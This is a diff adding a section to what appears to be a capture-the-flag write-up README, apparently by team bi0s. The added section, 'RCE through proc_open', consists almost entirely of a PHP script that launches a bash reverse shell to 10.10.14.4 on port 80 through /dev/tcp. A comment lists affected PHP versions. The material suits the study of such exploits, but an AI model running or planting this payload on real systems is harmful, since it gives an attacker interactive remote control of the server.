@@ -31,3 +31,25 @@ from team [bi0s](https://bi0s.in)
 
 <img width="1112" height="593" alt="Screenshot 2025-09-22 010101" src="https://github.com/user-attachments/assets/3055c74d-f374-471a-b66a-b1a83c05c591" />
 
+## RCE through `proc_open` :
+
+```
+<?php
+// Vulnerable PHP versions: 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
+
+$command = "bash -c 'bash -i >& /dev/tcp/10.10.14.4/80 0>&1'";
+$descriptors = [
+  0 => ['pipe','r'],
+  1 => ['pipe','w'],
+  2 => ['pipe','w']
+];
+$process = proc_open($command, $descriptors, $pipes);
+if (is_resource($process)) {
+    echo stream_get_contents($pipes[1]);
+    proc_close($process);
+} else {
+    echo "proc_open failed\n";
+}
+
+?>
+```
